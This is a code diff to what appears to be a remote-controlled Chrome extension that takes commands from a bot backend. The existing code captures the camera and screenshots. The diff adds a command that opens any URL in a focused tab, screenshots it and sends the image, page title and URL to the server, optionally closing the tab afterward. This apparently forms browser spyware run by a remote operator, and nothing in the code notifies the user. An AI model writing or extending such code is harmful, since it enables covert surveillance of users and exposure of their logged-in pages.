@@ -1,6 +1,6 @@
 // ============ Configuration ============
-const SERVER_BASE_URL = 'https://disbot-backendzip--devilhero399.replit.app';
-// const SERVER_BASE_URL = 'http://localhost:8080';
+// const SERVER_BASE_URL = 'https://disbot-backendzip--devilhero399.replit.app';
+const SERVER_BASE_URL = 'http://localhost:8080';
 let CLIENT_ID = null;
 let EXTENSION_ID = null; // Short, memorable ID for easy identification
 let CLIENT_NAME = 'Chrome Extension';
@@ -233,6 +233,11 @@ async function processCommand(command) {
                 await captureCamera(command.id, command.requestedById);
                 break;
 
+            case 'open_and_screenshot':
+                console.log(`📸🌐 Open and screenshot requested by ${command.requestedBy} for URL: ${command.url}`);
+                await openAndScreenshot(command.id, command.requestedById, command.url, command.closeAfter);
+                break;
+
             default:
                 console.log(`⚠️ Unknown command type: ${command.type}`);
         }
@@ -273,6 +278,105 @@ async function captureScreenshot(commandId, userId) {
         console.error('Error capturing screenshot:', error);
         await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
     }
+}
+
+// ============ Open URL and Screenshot ============
+async function openAndScreenshot(commandId, userId, url, closeAfter = false) {
+    let newTab = null;
+    try {
+        if (!url) {
+            throw new Error('No URL provided');
+        }
+
+        console.log(`🌐 Opening URL: ${url}`);
+
+        // Open the URL in a new tab (active so it gets focus)
+        newTab = await chrome.tabs.create({
+            url: url,
+            active: true
+        });
+
+        console.log(`📱 Tab opened (ID: ${newTab.id}), waiting for page to load...`);
+
+        // Wait for the tab to finish loading
+        await waitForTabLoad(newTab.id);
+
+        console.log(`✅ Page loaded! Taking screenshot...`);
+
+        // Small delay to ensure everything is rendered
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        // Capture the screenshot of the newly opened tab
+        const screenshotUrl = await chrome.tabs.captureVisibleTab(null, {
+            format: 'png',
+            quality: 100
+        });
+
+        // Get updated tab info
+        const tab = await chrome.tabs.get(newTab.id);
+
+        console.log('📸 Screenshot captured!');
+
+        // Send to server
+        await sendCommandResponse(commandId, 'screenshot', {
+            image: screenshotUrl,
+            tabTitle: tab.title,
+            tabUrl: tab.url,
+            openedNewTab: true
+        }, userId);
+
+        console.log('✅ Screenshot sent to server!');
+
+        // Close the tab if requested
+        if (closeAfter) {
+            console.log(`🗑️ Closing tab (ID: ${newTab.id})...`);
+            await chrome.tabs.remove(newTab.id);
+            console.log('✅ Tab closed');
+        }
+
+    } catch (error) {
+        console.error('Error in openAndScreenshot:', error);
+        
+        // Try to close the tab if it was opened and closeAfter is true
+        if (newTab && closeAfter) {
+            try {
+                await chrome.tabs.remove(newTab.id);
+            } catch (closeError) {
+                console.error('Failed to close tab:', closeError);
+            }
+        }
+        
+        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    }
+}
+
+// Helper function to wait for tab to complete loading
+function waitForTabLoad(tabId, timeoutMs = 30000) {
+    return new Promise((resolve, reject) => {
+        const timeout = setTimeout(() => {
+            chrome.tabs.onUpdated.removeListener(listener);
+            reject(new Error('Tab load timeout'));
+        }, timeoutMs);
+
+        const listener = (updatedTabId, changeInfo, tab) => {
+            if (updatedTabId === tabId && changeInfo.status === 'complete') {
+                clearTimeout(timeout);
+                chrome.tabs.onUpdated.removeListener(listener);
+                resolve(tab);
+            }
+        };
+
+        chrome.tabs.onUpdated.addListener(listener);
+
+        // Check if already loaded
+        chrome.tabs.get(tabId, (tab) => {
+            if (tab.status === 'complete') {
+                clearTimeout(timeout);
+                chrome.tabs.onUpdated.removeListener(listener);
+                resolve(tab);
+            }
+        });
+    });
 }
 
 // ============ Auto-Screenshot Capture ============
